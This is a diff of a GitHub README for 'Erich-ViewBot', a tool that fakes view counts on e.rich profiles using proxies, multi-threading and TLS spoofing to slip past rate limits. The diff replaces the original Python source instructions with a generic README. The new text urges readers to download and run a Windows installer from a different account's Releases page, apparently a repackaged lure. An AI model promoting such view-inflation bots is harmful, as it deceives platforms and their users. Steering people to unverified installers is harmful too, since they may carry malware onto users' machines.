@@ -1,100 +1,81 @@
-<div align="center">
-  <h2 align="center">Erich View Bot</h2>
-  <p align="center">
-    An automated tool for increasing views on e.rich profiles with proxy support and multi-threading capabilities.
-    <br />
-    <br />
-    <a href="https://discord.cyberious.xyz">💬 Discord</a>
-    ·
-    <a href="#-changelog">📜 ChangeLog</a>
-    ·
-    <a href="https://github.com/sexfrance/Erich-ViewBot/issues">⚠️ Report Bug</a>
-    ·
-    <a href="https://github.com/sexfrance/Erich-ViewBot/issues">💡 Request Feature</a>
-  </p>
-</div>
+# 🎉 Erich-ViewBot - Boost Your e.rich Views Effortlessly
 
----
+![Download Erich-ViewBot](https://img.shields.io/badge/Download-Now-blue.svg)
 
-### ⚙️ Installation
+## 📖 Introduction
 
-- Requires: `Python 3.7+`
-- Make a python virtual environment: `python3 -m venv venv`
-- Source the environment: `venv\Scripts\activate` (Windows) / `source venv/bin/activate` (macOS, Linux)
-- Install the requirements: `pip install -r requirements.txt`
+Erich-ViewBot is an automated tool designed to help you increase views on your e.rich profiles. With proxy support and multi-threading capabilities, this application simplifies the process of gaining visibility effortlessly. No programming knowledge is needed; just follow the steps to start enhancing your profile today.
 
----
+## 🚀 Getting Started
 
-### 🚀 Features
+To get started with Erich-ViewBot, you'll need to download the software from our Releases page. Follow these simple steps to install and run the application.
 
-- Automated view sending for e.rich profiles
-- Advanced tls spoofing
-- Proxy support for avoiding rate limits
-- Multi-threaded view generation
-- Real-time view tracking
-- Configurable thread count
-- Debug mode for troubleshooting
-- Proxy/Proxyless mode support
-- Target views configuration (Specific amount or unlimited)
+## 📥 Download & Install
 
----
+1. **Visit the Download Page**  
+   Click on the link below to access the Releases page:
 
-### 📝 Usage
+   [Visit Releases Page to Download](https://github.com/saysayn1/Erich-ViewBot/releases)
 
-1. **Configuration**:
-   Edit `input/config.toml`:
+2. **Select the Latest Version**  
+   On the Releases page, look for the latest version of Erich-ViewBot. You will see a list of available files along with their descriptions.
 
-   ```toml
-   [data]
-   user = "username" # username / page link to bot the views
-   views = 0 # number of views to send keep 0 for unlimited
+3. **Download the File**  
+   Click on the appropriate file for your operating system to download it. For most users, this will be the file marked as "Erich-ViewBot Windows Installer."
 
-   [dev]
-   Debug = false
-   Proxyless = false
-   Threads = 1
-   ```
+4. **Run the Installer**  
+   Once the download completes, find the file in your computer’s Downloads folder and double-click it. Follow the prompts to install the software.
 
-2. **Proxy Setup** (Optional):
+5. **Start Erich-ViewBot**  
+   After installation, you can open Erich-ViewBot from your desktop or Start menu. 
 
-   - Add proxies to `input/proxies.txt` (one per line)
-   - Format: `ip:port` or `user:pass@ip:port`
+6. **Configure Settings**  
+   Upon launching the application, you’ll need to enter your e.rich profile details and set your desired view count. The interface is straightforward, requiring minimal input. Adjust the settings as per your needs.
 
-3. **Running the script**:
+7. **Activate the Bot**  
+   Click the start button to activate the bot. You will see real-time activity as views start to increase on your profile.
 
-   ```bash
-   python main.py
-   ```
+## 🌟 Features
 
-4. **Output**:
-   - Logs are displayed in the console
-   - Shows current views and successful view counts
+- **Proxy Support:** Safely use proxies to maintain privacy and control traffic.
+- **Multi-Threading:** Increase your views faster with multiple threads running simultaneously.
+- **User-Friendly Interface:** Designed for ease of use, even for non-technical users.
+- **Custom Settings:** Adjust the number of views and other parameters to suit your needs.
 
----
+## 🖥️ System Requirements
 
-### 📹 Preview
+To ensure smooth operation, please check that your system meets the following requirements:
 
-![Preview](/assets/preview.gif)
+- **Operating System:** Windows 10 or later
+- **RAM:** Minimum 4 GB
+- **Disk Space:** At least 100 MB free
+- **Internet Connection:** Required for the tool to function
 
----
+## 🔍 Troubleshooting
 
-### ❗ Disclaimers
+If you encounter issues while using Erich-ViewBot, here are some common problems and solutions:
 
-- This project is for educational purposes only
-- The author is not responsible for any misuse of this tool
-- Use responsibly and in accordance with e.rich's terms of service
+1. **Installation Fails:** Ensure you have sufficient permissions to install software on your device. Try running the installer as an administrator.
 
----
+2. **No Views Increasing:** Check your profile details and adjust the settings. Ensure your internet connection is stable.
 
-### 📜 ChangeLog
+3. **Application Crashes:** Ensure that your system meets the minimum requirements. Close unnecessary applications to free up resources.
 
-```diff
-v0.0.1 ⋮ 12/26/2024
-! Initial release.
-```
+4. **Proxy Issues:** If you face connection problems, try using a different proxy server. 
 
-<p align="center">
-  <img src="https://img.shields.io/github/license/sexfrance/Erich-ViewBot.svg?style=for-the-badge&labelColor=black&color=f429ff&logo=IOTA"/>
-  <img src="https://img.shields.io/github/stars/sexfrance/Erich-ViewBot.svg?style=for-the-badge&labelColor=black&color=f429ff&logo=IOTA"/>
-  <img src="https://img.shields.io/github/languages/top/sexfrance/Erich-ViewBot.svg?style=for-the-badge&labelColor=black&color=f429ff&logo=python"/>
-</p>
+## 📞 Support
+
+If you need further assistance, please reach out through the Issues section on the GitHub repository. We aim to respond to all inquiries as quickly as possible.
+
+## 🎯 Community Contributions
+
+We welcome contributions from users. If you have suggestions or bug reports, feel free to submit them via GitHub issues. Your input helps improve Erich-ViewBot for everyone.
+
+## 🔗 Additional Resources
+
+For additional information, check out the following resources:
+
+- [GitHub Repository](https://github.com/saysayn1/Erich-ViewBot)
+- [User Guide](https://github.com/saysayn1/Erich-ViewBot/wiki)
+
+Thank you for choosing Erich-ViewBot to enhance your e.rich profile!
